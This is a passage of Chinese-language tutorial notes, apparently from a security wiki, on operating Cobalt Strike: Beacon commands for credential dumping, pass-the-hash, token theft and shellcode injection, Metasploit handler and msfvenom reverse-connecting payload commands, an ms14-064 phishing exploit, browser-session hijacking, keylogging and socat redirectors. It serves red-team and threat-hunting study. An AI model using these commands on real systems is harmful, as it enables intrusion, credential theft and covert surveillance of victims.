注入到指定进程注：不带任何参数则临时生成一个进程注入 12kill 结束指定进程kill [pid] 12link 前面介绍过了是用来连接SMB Beacon的link ip pipe name 1logonpasswords 执行mimikatz获取密码 1ls 显示目标机当前目录 12make_token 创建令牌前面有说过make_token username pass 12345678mimikatz 执行mimikatz命令mimikatz [module::command] &lt;args&gt;mimikatz [!module::command] &lt;args&gt;mimikatz [@module::command] &lt;args&gt;注：有些mimikatz命令需要system权限才能运行!代表强制将mimikatz提升到SYSTEM，然后再运行命令有些则需要使用Beacon当前访问令牌运行@代表强制mimikatz使用Beacon当前访问令牌运行命令 1mkdir 在目标机上创建目录 1234mode dns 使用DNS A作为数据通道(仅限DNS Beacon有效)mode dns6 使用DNS AAAA作为数据通道(仅限DNS Beacon有效)mode dns-txt 使用DNS TXT作为数据通道(仅限DNS Beacon有效)注：DNS Beacon默认使用DNS TXT作为数据通道 1mv 移动目标机上的文件 1net 在目标上执行net命 1note 为当前Beacon会话备注 123portscan 扫描端口portscan [targets] [ports] [arplicmp Inone] [max connections]注：前面有说过 123powerpick 非托管powershell技术powerpick [commandlet] [arguments]注：非托管powershell技术就是不使用powershell.exe程序来执行powershell命令 12powershell 通过powershell.exe执行命令powershell-import 导入Powershell脚本 12345ppid 父进程欺骗ppid [pid] 将指定进程作为父进程ppid 直接执行ppid取消父进程欺骗注：父进程欺骗顾名思义就是伪造子进程的父进程为指定进程。这个听起来有点绕其实以前对抗过某杀软的应该都知道过父都是为了达到同一个目的 1ps 显示进程列表 12psinject 在指定进程中执行PowerShell命令psinject [pid] [arch] [commandLet] [arguments] 12pth hash传递攻击pth [DOMAIN\\user] [NTLM hash] 1pwd 显示当前所在目录 123reg 注册表查询命令(仅能查询)reg query [x86|x64] [root\\path]reg queryv [x86|x64] [root\\path] [subkey] 123remote-exec 在远程主机上执行命令remote-exec [method] [target] [command]和上面那个在远程主机上执行payload生成会话的没啥区别只不过变成了执行命令 1rev2self 恢复Beacon原始令牌 1rm 删除文件 12rportfwd 反向端口转发rportfwd [bind port] [forward host] [forward port] 开启端口转发rportfwd stop [bind port] 停止指定端口转发rportfwd 本机端口 目标ip 目标端口 注：将指定的本机端口转发到目标ip的目标端口 12run 在目标上执行程序（输出回显）run [program] [arguments] 123runas 以其他用户权限执行程序runas [DOMAIN\\user] [password] [command] [arguments]注：相当于windows的runas命令 123runasadmin 提权后执行命令runasadmin [exploit] [command] [args]注：与前面的elevate命令相似只不过变成了提权执行命令 123runu 父进程欺骗runu [pid] [command] [arguments]注：与ppid差不多，runu使用指定进程作为父进程来执行命令 1screenshot 截屏 1setenv 设置环境变量 1shell 通过cmd执行命令 123shinject shellcode注入shinject [pid] &lt;x86|x64&gt; shellcode_raw_path注：使用时注意目标进程架构 1sleep 设置beacon睡眠时间 12socks SOCKS4代理(不建议使用)socks [stop|port] 停止或在指定端口开启代理 123spawn 派生会话spawn [x86|x64] [listener]注：默认情况下，spawn命令会在rundll32.exe中派生会话可以使用spawnto改变此默认 12spawnas 以其他用户身份派生会话spawnas [DOMAIN\\user] [password] [listener] 123456spawnto 设置Beacon派生会话时使用的程序spawnto [x86|x64] [程序路径]注：此命令用来更改Beacon默认派生会话时使用的程序，比如spawnto x64 C:\\Windows\\System32\\notepad.exe在派生一个新的x64会话时就会启动一个notepad进程来作为傀儡直接输入spawnto回车代表清除设置使用默认配置 12spawnu 在指定进程中派生会话spawnu [pid] [listener] 123ssh 使用ssh密码远程连接ssh [target:port] [user] [pass]注：通过Beacon内置的ssh客户端实现 123ssh-key 使用SSH密钥远程连接ssh [target:port] [user] [/path/to/key.pem]注：和上一个没啥区别 123steal_token 从进程中窃取访问令牌steal_token [pid]注：可以使用getuid命令会打印你的当前令牌,rev2self恢复的原始令牌。 1timestomp 复制指定文件时间戳到其他文件 1unlink 断开与子Beacon的连接 1upload 上传文件 Script Console 12345678910111213? 执行sleep判断语句并输出结果e 执行sleep说明语句help 帮助load 加载一个脚本ls 列出加载的所有脚本proff 关闭脚本分析器pron 为开启脚本分析器profile 脚本性能统计reload 重新加载脚本troff 关闭脚本跟踪功能tron 开启脚本跟踪功能unload 卸载脚本x 执行sleep表达式并输出结果 4.1.2 派生会话/会话传递会话传递相关命令 Beacon 被设计的最初目的就是向其他的 CS 监听器传递会话。 spawn：进行会话的传递，也可直接右击会话选择spawn命令进行会话的选择。默认情况下，spawn命令会在 rundll32.exe 中派生一个会话。为了更好的隐蔽性，可以找到更合适的程序（如 Internet Explorer） 并使用spawnto命令来说明在派生新会话时候会使用 Beacon 中的哪个程序。 spawnto：该命令会要求指明架构（x86 还是 x64）和用于派生会话的程序的完整路径。单独输入spawnto命令然后按 enter 会指示 Beacon 恢复至其默认行为。 inject：输入inject + 进程 id + 监听器名来把一个会话注入一个特定的进程中。使用 ps 命令来获取一个当前系统上的进程列表。使用inject [pid] x64来将一个64位 Beacon 注入到一个 64位进程中。 spawn和inject命令都将一个 payload stage 注入进内存中。如果 payload stage 是 HTTP、HTTPS 或 DNS Beacon 并且它无法连接到你，那么将看不到一个会话。如果 payload stage 是一个绑定的 TCP 或 SMB 的 Beacon，这些命令会自动地尝试连接到并控制这些 payload。 dllinject：dllinject + [pid]来将一个反射性 DLL 注入到一个进程中。 shinject：使用shinject [pid] [架构] [/路径/…/file.bin]命令来从一个本地文件中注入 shellcode 到一个目标上的进程中。 shspawn：使用shspawn [架构] [/路径/…/file.bin]命令会先派生一个新进程（这个新进程是 spawn to 命令指定的可执行文件），然后把指定的 shellcode 文件（ file.bin ）注入到这个进程中。 dllload：使用dllload [pid] [c:\\路径...\\file.dll]来在另一个进程中加载磁盘上的 DLL文件。 4.1.2.1 CS自身增加会话1.首先创建一个新的监听器，用于自身派生会话。 2.然后在要派生的会话上右键点击Spawn即可。 3.选择要派生到刚刚新建的监听器上，点击choose即可。 4.可以看到会话成功派生。 4.1.2.2 在其他teamserver上做备份会话1.在另一台Linux服务器上开启teamserver。 2.通过客户端连接上新开启的teamserver。 3.新建一个监听器，用于将会话派生到新开启的teamserver上。 4.选择将要派生到teamserver的会话，通过spawn模块派生即可。 5.在新开启的teamserver上查看会话成功派生。 4.1.2.3 CS派生MSF会话1.在 Kail上开启metasploit框架，并开启监听。 12345use exploit/multi/handler set payload windows/meterpreter/reverse_httpset lhost 10.251.0.33set lport 7777exploit -j 2.在Cobalt Strike上创建一个监听器。 3.通过Spawn将会话派生到新创建的监听器中。 4.在msf服务器上查看会话已经成功派生。 4.1.2.4 MSF 生成木马与CS会话1.通过 msfvenom 生成木马文件。其中LHOST和LPORT要设置为teamserver的IP与端口。 1msfvenom -p windows/meterpreter/reverse_http LHOST=10.251.0.35 LPORT=9999 -f exe &gt; /tmp/msf.exe 2.在Cobalt Strike上创建一个监听器。 3.将木马文件上传到目标靶机，并执行。目标成功在Cobalt Strike上线。 4.1.2.5 MSF使用溢出exp与CS会话使用ms14-064漏洞进行测试。 这里简单介绍一下ms14-064漏洞： Microsoft Windows OLE远程代码执行漏洞，OLE（对象链接与嵌入）是一种允许应用程序共享数据和功能的技术，远程攻击者利用此漏洞通过构造的网站执行任意代码，影响Win95+IE3 –Win10+IE11全版本。 具体利用流程如下： 1.在msf服务器上搜索ms14-064模块。 2、使用对应模块，并设置参数。 12use exploit/windows/browser/ms14_064_ole_code_executionset payload windows/meterpreter/reverse_http 参数设置如下，svrhost、svrport设置为MSF的IP和端口，payload的lhost、lport设置为CS监听器的IP和端口。 这里要简单说明几个参数的作用： 1.set Disablepayloadhandler true：这告诉metasploit框架，它不需要在metasploit框架内创建处理程序来服务有效负载连接。 2.set PrependMigrate true：告诉metasploit框架修改其stager，以便在利用之后立即迁移到另一个进程，此选项对于客户端攻击非常重要。它允许您的会话在被利用的应用程序崩溃或关闭时存活。 通过exploit执行完，会生成一行钓鱼链接： 3.在 Cobalt Strike 上设置监听器。 监听器设置的payload，hosts和port均要与msf上所设置的一致。 4.在目标靶机上的IE浏览器中执行MSF的钓鱼链接。 4.1.2.6 MSF派生CS会话通过ms14-064漏洞进行演示。 1.通过ms14-064漏洞获取目标主机的meterpreter会话。 步骤与上述的基本一致，只需要修改Lhost、Lport为MSF服务的IP和端口，以及disablepayloadhandler 的值为false即可，参数设置如下。 通过exploit执行获得链接 并在目标靶机上执行即可。 这时候可以看到成功获取到meterpreter会话了。 2.将会话派生到 Cobalt Strike上。 使用 123use exploit/windows/local/payload_inject set payload windows/meterpreter/reverse_httpset session 1 设置对应的参数。 3.在Cobalt Strike 上创建监听器。 4.执行msf的模块 5.在Cobalt Strike上可以看到会话成功派生。 4.2 Explore用户驱动攻击简单来说就是控制端通过远程控制让受控端来执行某一些操作。 常见的用户驱动攻击的模块如下：屏幕截图、键盘记录、进程处理、端口扫描、用户发现、文件管理、远程vnc、浏览器代理(仅针对ie浏览器)等，如下图所示。 ![](D:/a_sangfor_outside_work/高级威胁组/学习资料/Cobalt Strike/1-Cobalt Strike基础/picture/23.png) 4.2.1 浏览器代理浏览器转发是指在已经攻击成功的目标中，利用目标的信息登录网站进行会话劫持，但是目前只支持目标正在使用IE浏览器的前提下。关于如何判断当前用户是否使用IE浏览器，则可以通过屏幕截图来判断。如下图中，通过屏幕截图可以看到目标正在使用IE浏览器登陆着当前网站。 具体使用步骤如下： 1.选择 Browser Privot 代理。 2.选择对应的进程。 这里我们要将Proxy Serve Port 的值记录下来。 在命令行可以看到浏览器代理已经成功开启。 3.为CS上的服务器的浏览器设置代理。代理服务器的IP地址为teamserver的IP地址，代理端口为刚刚记录下的Proxy Serve Port 的值。 如果目标用户曾经通过IE浏览器登录某网站后台，并保存登录信息。这时候我们只需要通过访问目标后台地址即可实现免密登录。 5.通过browserpivot stop 关闭浏览器代理。 4.2.2 远程VNC该模块可以对目标用户进行远程控制，具体使用步骤如下。 选择VNC模块进行利用。 运行结果如下： 4.2.3 文件管理浏览会话系统文件位置在右击会话处，选择 Explore –&gt; File Browser即可打开。在这里可以对当前会话下的文件进行浏览、上传、下载、删除等操作。 在进行文件浏览时，如果 beacon 设置的 sleep 值较高，CS会因此而变得响应比较慢。 彩色文件夹表示该文件夹的内容位于此文件浏览器的缓存中；深灰色的文件夹表示该文件夹的内容不在此文件浏览器缓存中。 文件下载 download：下载请求的文件。Beacon 会下载它的任务要求获取的每一个文件的固定大小的块。这个块的大小取决于 Beacon 当前的数据通道。HTTP 和 HTTPS 通道会拉取 512kb 的数据块。 downloads：查看当前 Beacon 正在进行的文件下载列表。 cancel：该命令加上一个文件名来取消正在进行的一个下载任务。也可以在 cancel 命令中使用通配符来一次取消多个文件下载任务。 下载文件都将下载到CS团队服务器中，在View –&gt; Download下可看到下载文件的记录，选中文件后使用Sync Files即可将文件下载到本地。 文件上传 upload：上传一个文件到目标主机上。 timestomp：将一个文件的修改属性访问属性和创建时间数据与另一个文件相匹配。当上传一个文件时，有时会想改变此文件的时间戳来使其混入同一文件夹下的其他文件中，使用timestomp 命令就可以完成此工作。 选择File Browser模块进行利用。 结果如下： 4.2.4 Net View该模块用于显示域列表、计算机列表或指定计算机的共享资源列表，具体使用步骤如下。 选择对应的Net View模块利用即可。 运行结果如下： 4.2.5 端口扫描该模块用于探针目标主机所在网段内主机端口开放情况，使用步骤如下。 1.选择对应的 Port Scan 模块进行利用。 2.选择需要探针的网段、端口范围、最大连接数以及使用的协议类型。 3.查看命令行，发现扫描已经开始运行。 4.在View视图内的Targets可以查看扫描结果。 4.2.6 进程列表该模块用于查看目标的进程，使用该模块可以对目标主机进行进程注入、屏幕截图，键盘记录、删除进程等操作，使用步骤如下。 1.右键选择Explore下的Process List模块。 2.控制台输出区可以查看进程列表。 3.选择explore.exe进程，点击Screenshot进行屏幕截取。 运行结果可以在view视图的Screenshots中查看。 4.2.7 屏幕截取该模块用于对目标屏幕进行截取，该模块运行的结果与上述在进程列表中通过Screenshot进行截图的结果基本一致，具体使用步骤如下。 右键选择Explore下的Screenshot模块进行利用即可。 4.2.8 键盘记录右键选择Explore下的Process List模块。点击Log Keystrokes进行键盘记录，运行结果可以在view视图的Keystrokes中查看。 参考资料 https://teamssix.com/year/201023-192553.html https://xz.aliyun.com/t/3975 https://payloads.online/tools/socat https://zhuanlan.zhihu.com/p/93718885 https://www.anquanke.com/post/id/156299 https://www.bilibili.com/video/BV16b411i7n5 https://www.freebuf.com/sectool/173366.html https://my.oschina.net/u/4300698/blog/3382230 https://segmentfault.com/a/1190000019290085 https://www.cnblogs.com/cthon/p/9151467.html https://www.secpulse.com/archives/127186.html https://www.freebuf.com/articles/web/231892.html https://klionsec.github.io/2017/09/23/cobalt-strike/ https://www.renfei.org/blog/introduction-to-spf.html https://www.cnblogs.com/backlion/p/10616308.html https://blog.csdn.net/hnjztyx/article/details/52910478 http://blog.leanote.com/post/snowming/62ec1132a2c9 https://blog.csdn.net/pipisorry/article/details/52269785 https://blog.csdn.net/l1028386804/article/details/86675559 https://www.freebuf.com/company-information/167460.html https://blog.csdn.net/qq_34101364/article/details/108062913 https://blog.csdn.net/github_35186068/article/details/80518681 https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/ https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/ https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/","tags":[{"name":"Cobalt Strike","slug":"Cobalt-Strike","permalink":"http://example.com/tags/Cobalt-Strike/"}],"categories":[{"name":"威胁猎捕","slug":"威胁猎捕","permalink":"http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/"},{"name":"Cobalt Strike","slug":"威胁猎捕/Cobalt-Strike","permalink":"http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt-Strike/"}]},{"title":"1-Cobalt Strike基础上篇","date":"2021-07-03T03:35:03.000Z","path":"wiki/威胁猎捕/Cobalt Strike/1-Cobalt-Strike基础上篇/","text":"[TOC] by Tahir 2021.6.8 1.Cobalt Strike 模块详解1.1 Cobalt Strike 模块Cobalt Strike 模块的功能选项，如下图。 New Connection：打开一个新的”Connect”窗口。在当前窗口中新建一个连接，即可同时连接不同的团队服务器( 便于团队之间的协作)。 Preferences：偏好设置，首选项，用于设置Cobalt Strike主界面、控制台、TeamServer 连接记录、报告的样式。 Visualization：将主机以不同的权限展示出来（主要以输出结果的形式展示）。 VPN Interfaces：设置VPN接口。 Listeners：创建监听器。 Script Manager：查看和加载CNA脚本。 Close：关闭当前与TeamServer的连接。 1.2 View 模块 Applications：显示被控机器的应用信息。 Credentials：通过HashDump或mimikatz获取的密码或者散列值都储存在这里。 Downloads：从被控机器中下载的文件。 Event Log：主机上线记录，以及与团队协作相关的聊天记录和操作记录。 Keystrokes：键盘记录。 Proxy Pivots：代理模块。 Screenshots：屏幕截图模块。 Script Console：控制台，在这里可以加载各种脚本。（链接） Targets：显示目标。 Web Log：Web 访问日志。 1.3 Attacks 模块下面介绍Attacks模块下的Packages 和 Web Drive-by 模块。 1.Packages模块 依次单击 “Attacks” → “Packages” 选项，可以看到一系列功能模块，如下图。 HTML Application：基于HTML应用的Payload模块，通过HTML调用其他语言的应用组件进行攻击测试，提供了可执行文件、PowerShell、 VBA三种方法。 MS Office Macro：生成基于Office病毒的Payload 模块。 Payload Generator：Payload 生成器，可以生成基于C、C#、COM Scriptlet、 Java、 Perl、 PowerShell、Python、 Ruby、 VBA等的Payload。 USB/CD AutoPlay：用于生成利用自动播放功能运行的后门文件。 Windows Dropper：捆绑器，能够对文档进行捆绑并执行Payload。 Windows Executable：可以生成32位或64位的EXE和基于服务的EXE、DLL等后门程序。在32位的Windows操作系统中无法执行64位的Payload, 而且对于后渗透测试的相关模块，使用32位和64位的Payload会产生不同的影响，因此在使用时应谨慎选择。 Windows Executable (S)：用于生成一个Windows 可执行文件，其中包含Beacon的完整Payload,不需要阶段性的请求。与Windows Executable模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持PowerShell脚本，可用于将Stageless Payload注入内存。 2.Web Drive-by 模块 依次单击 “Attacks” → “Web Drive-by” 选项，可以看到一系列基于网络驱动的功能模块，如下图。 Manage：管理器，用于对TeamServer上已经开启的Web服务进行管理，包括 Listener 及 Web Delivery模块。 Clone Site：用于克隆指定网站的样式。 Host File：用于将指定文件加载到Web目录中，支持修改Mime Type。 Script Web Delivery：基于Web的攻击测试脚本，自动生成可执行的Payload。 Signed Applet Attack：使用Java自签名的程序进行钓鱼攻击测试。如果用户有Applet 运行权限，就会执行其中的恶意代码。 Smart Applet Attack：自动检测Java的版本并进行跨平台和跨浏览器的攻击测试。该模块使用嵌入式漏洞来禁用Java的安全沙盒。可利用此漏洞的Java版本为1.6.0_45以下及1.7.0 _21以下。 System Profiler：客户端检测工具，可以用来获取一些系统信息，例如系统版本、浏览器版本、Flash版本等。 1.4 Reporting模块Reporting模块可以配合Cobalt Strike的操作记录、结果等，直接生成相关报告，如下图。 Activity report：活动报告生成。 Hosts report：主机报告。 Indicators of Compromise：目标报告。 Sessions Report：会话报告。 Social Engineering Peport：社会工程学报告。 Tactics, Techniques, and Procedures：战术技术过程，TTPs。 Reset Data：重置数据。 Export data：数据出口。 2.基础设施任何行动的第一步都是建立基础设施。就 Cobalt Strike 而言，基础设施由一个或多个团队服务器、重定向器以及指向你的团队服务器和重定向器的 DNS 记录组成。一旦团队服务器启动并运行，你将需要连接到它并将其配置为接收来自受害系统的连接。监听器就是 Cobalt Strike 中用来执行这种任务的机制。 2.1 监听器管理 什么是监听器 顾名思义，监听器就是等待被入侵系统连接自己的一个服务。 监听器的作用 主要是为了接受payload回传的各类数据，类似于MSF中handler的作用。 比如payload在目标机器执行以后，就会回连到监听器然后下载执行真正的shellcode代码。 一旦监听器建立起来，团队成员只需要知道这个监听器的名称即可，不用关心监听器背后的基础环境，接下来将深入了解如何准确配置监听器。 一个监听器既是一个 payload 的配置信息，同时又是 Cobalt Strike 起一个服务器来接收来自这个payload 的连接的指示。一个监听器由用户定义的名称、payload 类型和几个特定于 payload 的选项组成。 监听器的名字一般由以下结构组成： 1OperatingSystem/Payload/Stager 例如： 1windows/beacon_http/reverse_http 什么是传输器 payload staging（分阶段传送 payload）。在很多攻击框架的设计中，解耦了攻击和攻击执行的内容。payload 就是攻击执行的内容。payload 通常被分为两部分：payload stage 和 payload stager。 攻击载荷payload就是攻击执行的内容。攻击载荷通常被分为两部分：传输器stager 和传输体stage。 传输器stager是一个小程序，用于连接、下载传输体stage，并插入到内存中。 stager 是一个小程序，通常是手工优化的汇编指令，用于下载一个payload stage、把它注入内存，然后对其传达执行命令。这个过程被称为 staging（分阶段）。staging（分阶段）过程在一些攻击行动中是必要的。很多攻击中对于能加载进内存并在成功漏洞利用后执行的数据大小存在严格限制。这会极大地限制你的后渗透选择，除非你分阶段传送你的后渗透payload。Cobalt Strike 在它的用户驱动攻击中使用 staging（分阶段）。大多数这类项目Attacks → Packages 和 Attacks → Web Drive-by 选项下。使用什么样的 stager 取决于与攻击配对的 payload。比如，HTTP Beacon 有一个 HTTP stager。DNS Beacon 有一个 DNS TXT 记录 stager。不是所有的 payload 都有 stager 选项。 没有 stager 的 Payload 不能使用这些攻击选项投递。如果你不需要 payload staging（分阶段），通过在你的 C2 拓展文件里把 host_stage 选项设为false，你可以关闭这个选项。这会阻止 Cobalt Strike 在其 web 和 DNS 服务器上托管 payloadstage。这种设置有助于提升行为安全（避免反溯源），因为如果开启了 staging（分阶段），任何人都能连到你的服务器上，请求一个 payload、并分析它的内容，从而可以从你的 payload 配置中获取信息。 创建监听器 要管理 Cobalt Strike 的监听器，通过 Cobalt Strike → Listeners 。这会打开一个标签页，列举出所有你的配置的 payload 和监听器。 在填写监听器的相关信息之前，需要先来了解监听器有哪些类型。 Cobalt Strike有两种类型的监听器： Beacon Beacon直译过来就是灯塔、信标、照亮指引的意思，Beacon是较为隐蔽的后渗透代理，个人理解Beacon类型的监听器应该是平时比较常用的。Beacon监听器的名称例如： 1windows/beacon_http/reverse_http Foreign Foreign直译就是外部的，这里可以理解成对外监听器，这种类型的监听器主要作用是给其他的Payload提供别名，比如Metasploit 框架里的Payload，个人理解Foreign监听器在一定程度上提高了CS的兼容性。对外监听器的名称例如： 1windows/foreign/reverse_https 2.2 HTTP Beacon和HTTPS BeaconBeacon是什么 Beacon是CS的Payload Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。 通过HTTP、HTTPS和DNS出口网络 使用SMB协议的时候是点对点通信 Beacon有很多的后渗透攻击模块和远程管理工具 Beacon的类型 HTTP 和 HTTPS Beacon HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。 12windows/beacon_http/reverse_httpwindows/beacon_https/reverse_https DNS Beacon 12windows/beacon_dns/reverse_dns_txtwindows/beacon_dns/reverse_http SMB Beacon SMB Beacon也可以叫做pipe beacon 1windows/beacon_smb/bind_pipe 创建一个HTTP Beacon 点击 Cobalt Strike –&gt; Listeners 打开监听器管理窗口，点击Add，输入监听器的名称、监听主机地址，因为这里是要创建一个HTTP Beacon，所以其他的默认就行，最后点击Save 此时可以测试一下刚才设置的监听器，点击Attack –&gt; Web Drive-by –&gt; Scripted Web Delivery(s) ，在弹出的窗口中选择刚才新添的Listener，因为我的靶机是64位的，所以我把Use x64 payload也给勾选上了，最后点击Launch。基础篇有详细步骤介绍。 HTTPS Beacon HTTPS Beaocn和HTTP Beacon一样，使用了相同的Malleable C2配置文件，使用GET和POST的方式传输数据，不同点在于HTTPS使用了SSL，因此HTTPS Beacon就需要使用一个有效的SSL证书，具体如何配置可以参考：https://www.cobaltstrike.com/help-malleable-c2#validssl 2.3 DNS BeaconDNS Beacon，顾名思义就是使用DNS请求将Beacon返回。这些 DNS 请求用于解析由你的 CS 团队服务器作为权威 DNS 服务器的域名。DNS 响应告诉 Beacon 休眠或是连接到团队服务器来下载任务。DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务。 在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方。 DNS Beacon的工作流程具体如下： 首先，CS服务器向目标发起攻击，将DNS Beacon传输器stager嵌入到目标主机内存中，然后在目标主机上的DNS Beacon传输器stager回连下载CS服务器上的DNS Beacon传输体stage，当DNS Beacon在内存中启动后就开始回连CS服务器，然后执行来自CS服务器的各种任务请求。 原本DNS Beacon可以使用两种方式进行传输，一种是使用HTTP来下载Payload，一种是使用DNS TXT记录来下载Payload，不过现在4.0版本中，已经没有了HTTP方式，CS4.0以及未来版本都只有DNS TXT记录这一种选择了，所以接下来重点学习使用DNS TXT记录的方式。 根据作者的介绍，DNS Beacon拥有更高的隐蔽性，但是速度相对于HTTP Beacon会更慢。 域名配置 既然是配置域名，所以就需要先有个域名，这里就用一个博客域名作为示例：添加一条A记录指向CS服务器的公网IP，再添加几条ns记录指向A记录域名即可。 添加一个监听器，DNS Hosts填写NS记录和A记录对应的名称，DNS Host填写A记录对应的名称 根据基础篇的方法创建一个攻击脚本，放到目标主机中运行后，在CS客户端可以看到一个小黑框 然后经过一段时间的等待，就可以发现已经上线了 2.4 SMB BeaconSMB Beacon 使用命名管道通过一个父 Beacon 进行通信。这种对等通信对同一台主机上的 Beacon 和跨网络的 Beacon 都有效。Windows 将命名管道通信封装在 SMB 协议中。因此得名 SMB Beacon。 因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效（系统防火墙默认是允许445的端口与外界通信的，其他端口可能会弹窗提醒，会导致远程命令行反弹shell失败）. SMB Beacon监听器对“提升权限”和“横向渗透”中很有用。 SMB Beacon 配置 首先需要一个上线的主机，这里我使用的HTTP Beacon，主机上线后，新建一个SMB Beacon，输入监听器名称，选择Beacon SMB，管道名称可以直接默认，也可以自定义。 接下来在Beacon中直接输入spawn SMB，这里的SMB指代的是创建的SMB Beacon的监听器名称，也可以直接右击session，在Spawn选项中选择刚添加的SMB Beacon。 等待一会儿，就可以看到派生的SMB Beacon，在external中可以看到IP后有个∞∞字符。 接下来我这里将SMB Beacon插入到进程中，以firefox进程为例。 在firefox中插入SMB Beacon后，便能看到process为firefox的派生SMB Beacon。 在CS中，如果获取到目标的管理员权限，在用户名后会有*号标注。 当上线主机较多的时候，只靠列表的方式去展现，就显得不太直观了，通过CS客户端中的透视图便能很好的展现。 2.5 重定向器重定向器Redirectors是一个位于CS团队服务器和目标网络之间的服务器，这个重定向器通俗的来说就是一个代理工具，或者说端口转发工具，担任CS服务器与目标服务器之间的跳板机角色，整体流量就像下面这样。 1目标靶机 &lt;--------&gt; 多个并列的重定向器 &lt;------&gt; CS服务器 重定向器在平时的攻击或者防御的过程中起到很重要的作用，主要有以下两点： 保护自己的CS服务器，避免目标发现自己的真实IP 提高整体可靠性，因为可以设置多个重定向器，因此如果有个别重定向器停止工作了，整体上系统依旧是可以正常工作的 Cobalt Strike 的监听器管理功能支持使用重定向器。当你设置一个 HTTP 或 HTTPS Beacon 监听器的时候，简单的指定你的重定向器 IP （在 Host 字段填入）。 Cobalt Strike 不会验证这个信息。如果你提供的 host 不隶属于当前主机（不是团队服务器的 IP），那么 Cobalt Strike 就假设它是重定向器。一种把服务器转变为重定向器的简单方法是使用 socat。 创建一个重定向器 这里就使用自己的内网环境作为测试了，首先理清自己的IP CS服务器IP：10.251.0.35 目标靶机IP：10.251.0.29 重定向器IP：10.251.0.33 10.251.0.36 首先，需要先配置重定向器的端口转发，比如这里使用HTTP Beacon，就需要将重定向器的80端口流量全部转发到CS服务器上，使用socat的命令如下：下面是一句 socat 语法，作用是：将80端口上的所有连接转发到位于192.168.12.100的团队服务器的80端口： 1socat TCP4-LISTEN:80,fork TCP4:10.251.0.35:80 如果提示没有socat命令，安装一下即可。重定向器设置好之后，就新建一个HTTP Beacon，并把重定向器添加到HTTP Hosts主机列表中 2.6 攻击载荷安全特性 在Beacon传输Payload到目标上执行任务时都会先验证团队服务器，以确保Beacon只接受并只运行来自其团队服务器的任务，并且结果也只能发送到其团队服务器。 在刚开始设置Beacon Payload时，CS会生成一个团队服务器专有的公私钥对，这个公钥嵌入在Beacon的Payload Stage中。Beacon使用团队服务器的公钥来加密传输的元数据，这个元数据中一般包含传输的进程ID、目标系统IP地址、目标主机名称等信息，这也意味着只有团队服务器才能解密这个元数据。 当Beacon从团队服务器下载任务或团队服务器接收Beacon输出时，团队服务器将会使用Beacon生成的会话秘钥来加密任务并解密输出。 值得注意的是，Payload Stagers 因为其体积很小，所以没有这些的安全特性。 3.目标攻击3.1 客户端攻击什么是客户端攻击 客户端攻击根据教程直译过来就是一种依靠应用程序使用控制端来进行的可视化攻击。 原文：A client-side attack is an attack against an application used to view attacker controlled content. 为什么要进行客户端攻击 随着时代发展到了今天，在有各种WAF、防火墙的情况下，各种漏洞已经很难像过去那么好被利用了，攻击者想绕过防火墙发动攻击也不是那么容易的了。 而当我们发送一个钓鱼文件到客户端上，再由客户端打开这个文件，最后客户端穿过防火墙回连到我们，此时在客户端上我们就获得了一个立足点foothold。这样的一个过程是相对而言是较为容易的，这也是为什么要进行客户端攻击。 如何获得客户端上的立足点 1、尽可能多的了解目标环境，即做好信息收集工作 2、创建一个虚拟机，使它与目标环境尽可能的一致，比如操作系统、使用的浏览器版本等等都需要保证严格一致 3、攻击刚刚创建的虚拟机，这会是最好的攻击目标 4、精心策划攻击方法，达到使目标认为这些攻击行为都是正常行为的效果 5、将精心制作的钓鱼文件发送给目标，比如钓鱼邮件 如果这五步都非常细致精心的去准备，那么攻击成功的概率会大幅提升。 3.2 系统侦察 System Profiler系统侦察System Profiler是一个方便客户端攻击的侦察工具，这个工具将会在CS服务端上启动一个Web服务，这样当目标访问这个Web服务的时候，我们就能够看到目标使用的浏览器、操作系统等等指纹信息。 设置系统侦察需要首先在自己的VPS服务器上运行CS服务端，之后本地客户端进行连接，选择System Profiler功能模块，配置待跳转的URL等信息即可。 如果勾选了Use Java Applet to get information则可以发现目标的Java版本及内网IP地址，但是这样做被发现的风险就会提高，同时现在浏览器已经默认关闭了java执行权限，因此这个选项的作用也变得不大了。 配置完后，当用户打开配置后的链接，我们可以在三个地方进行观察 1231、View --&gt; Applications2、View --&gt; Web Log3、Cobalt Strike --&gt; Visualization --&gt; Target Table 目标用户打开链接时，我们在CS上就能够看到目标使用的浏览器版本、系统版本等信息了，知道了版本信息，就能够进一步知道目标上可能存在什么漏洞。 注意的一点是如果 Cobalt Strike 的 web 服务器收到了lynx、wget 或 curl 的请求，CS会自动返回一个 404 页面，这样做是为了防御蓝队的窥探。 3.3 用户驱动攻击用户驱动攻击User-Driven Attacks需要欺骗用户产生交互才行，但也有许多的优点。 首先用户驱动攻击不包含恶意攻击代码，所以用户系统上的安全补丁是没用的；其次无论目标使用什么版本的程序，我们都可以创建相应的功能来执行；最后因为用户驱动攻击十分可靠，也使得它很完美。 当我们采取行动来追踪并需要攻击时，它就像用户本地执行程序一样，CS为我们提供了几个用户驱动攻击的选项，分别如下： 用户驱动攻击包 用户驱动攻击包User-Driven Attacks Packages功能打开位置：Attacks –&gt; Packages 1、HTML应用 HTML应用HTML Application生成(executable/VBA/powershell)这3种原理不同的VBScript实现的evil.hta文件。 2、Microsoft Office 宏文件 Microsoft Office 宏文件Microsoft Office Document Macros可以生成恶意宏放入office文件，非常经典的攻击手法。 3、Payload 生成器 Payload生成器Payload Generator可以生成各种语言版本的Payload，便于进行免杀。 4、Windows 可执行文件 Windows 可执行文件Windows Executable 会生成一个Windows可执行文件或DLL文件。默认x86，勾选x64表示包含x64 payload 